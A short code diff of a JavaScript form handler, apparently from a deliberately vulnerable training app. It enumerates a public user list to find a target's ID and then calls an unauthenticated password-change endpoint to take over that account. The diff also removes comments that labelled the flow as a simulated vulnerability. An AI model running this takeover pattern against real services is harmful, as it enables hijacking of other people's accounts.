@@ -16,7 +16,6 @@ form.addEventListener('submit', async (e) => {
 
     try {
         // 1. Сначала ищем ID пользователя по логину
-        // (Имитация уязвимости: перебор публичного списка пользователей)
         const usersResponse = await apiClient.get('/api/v1/users/users/');
         const users = usersResponse.data;
         const targetUser = users.find(u => u.username === username);
@@ -28,7 +27,6 @@ form.addEventListener('submit', async (e) => {
         msgBox.textContent = 'Identity found. Overriding credentials...';
 
         // 2. Отправляем запрос на смену пароля
-        // PUT /api/v1/users/users/new_password
         await apiClient.put('/api/v1/users/users/new_password', {
             id: targetUser.id,
             password: newPassword
